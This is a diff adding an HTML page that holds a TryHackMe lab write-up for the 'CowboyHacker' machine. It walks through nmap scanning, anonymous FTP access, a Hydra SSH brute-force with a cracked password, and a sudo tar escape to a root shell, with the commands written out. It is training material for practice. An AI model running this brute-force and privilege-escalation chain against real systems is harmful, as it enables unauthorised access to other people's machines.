@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CowboyHacker - TryHackMe Writeup | Svfear</title>
+  <link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+  <header>
+    <h1>CowboyHacker - TryHackMe Writeup</h1>
+    <p>By Svfear | 90 Days of Machines Challenge</p>
+  </header>
+
+  <main>
+    <section class="content">
+      <h2>🧠 Introduction</h2>
+      <p>
+        This write-up covers the <strong>CowboyHacker</strong> machine from TryHackMe.
+        The goal was to enumerate the system, gain user access, and escalate privileges to root.
+      </p>
+
+      <h2>🔍 Nmap Scan</h2>
+      <pre><code>nmap -sV -sS -sC 10.10.16.96 -oA bounty_hacker</code></pre>
+      <img src="../assets/cowboyhacker/nmap.png" alt="nmap scan results" />
+
+      <p>Open ports found:</p>
+      <ul>
+        <li>21/tcp - FTP (vsFTPd 3.0.5)</li>
+        <li>22/tcp - SSH (OpenSSH 8.2p1)</li>
+        <li>80/tcp - HTTP (Apache 2.4.41)</li>
+      </ul>
+
+      <h2>📂 FTP Enumeration</h2>
+      <pre><code>ftp 10.10.16.96
+Connected to 10.10.16.96.
+220 (vsFTPd 3.0.5)
+Name (10.10.16.96:svfear): anonymous
+</code></pre>
+
+      <p>Anonymous login was allowed. Listing files:</p>
+      <pre><code>-rw-rw-r--    1 ftp ftp 418 Jun 07 2020 locks.txt
+-rw-rw-r--    1 ftp ftp 68  Jun 07 2020 task.txt
+</code></pre>
+
+      <img src="../assets/cowboyhacker/ftp-listing.png" alt="ftp file listing" />
+
+      <p>
+        The <strong>task.txt</strong> file revealed the username <code>lin</code>,
+        and <strong>locks.txt</strong> appeared to be a password wordlist.
+      </p>
+
+      <h2>🔑 Brute-forcing SSH with Hydra</h2>
+      <pre><code>hydra -l lin -P locks.txt 10.10.16.96 ssh</code></pre>
+      <img src="../assets/cowboyhacker/hydra.png" alt="hydra cracking result" />
+
+      <p>Hydra found valid credentials:</p>
+      <pre><code>lin : RedDr4gonSynd1cat3</code></pre>
+
+      <h2>💻 Gaining User Access</h2>
+      <pre><code>ssh lin@10.10.16.96
+lin@ip-10-10-16-96:~/Desktop$ ls
+user.txt
+</code></pre>
+
+      <h2>🚀 Privilege Escalation</h2>
+      <p>Checking sudo permissions:</p>
+      <pre><code>sudo -l
+User lin may run the following commands on ip-10-10-16-96:
+    (root) /bin/tar
+</code></pre>
+
+      <p>Using <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a>, we found a tar exploit to gain root:</p>
+      <pre><code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></pre>
+
+      <img src="../assets/cowboyhacker/root-shell.png" alt="root shell obtained" />
+
+      <p>Success! We are root.</p>
+      <pre><code># cd /root
+# ls
+root.txt  snap
+</code></pre>
+
+      <img src="../assets/cowboyhacker/root-flag.png" alt="root flag" />
+
+      <h2>🏁 Conclusion</h2>
+      <p>
+        <strong>CowboyHacker</strong> was a fun and straightforward beginner machine focusing on
+        service enumeration, basic brute-force, and privilege escalation via <code>tar</code>.
+      </p>
+
+      <p>
+        ✅ Skills Practiced: FTP enumeration, Hydra brute-force, SSH access, and privilege escalation.
+      </p>
+    </section>
+  </main>
+
+  <footer>
+    <p>© 2025 Svfear | <a href="https://github.com/svfear" target="_blank">GitHub</a></p>
+  </footer>
+</body>
+</html>
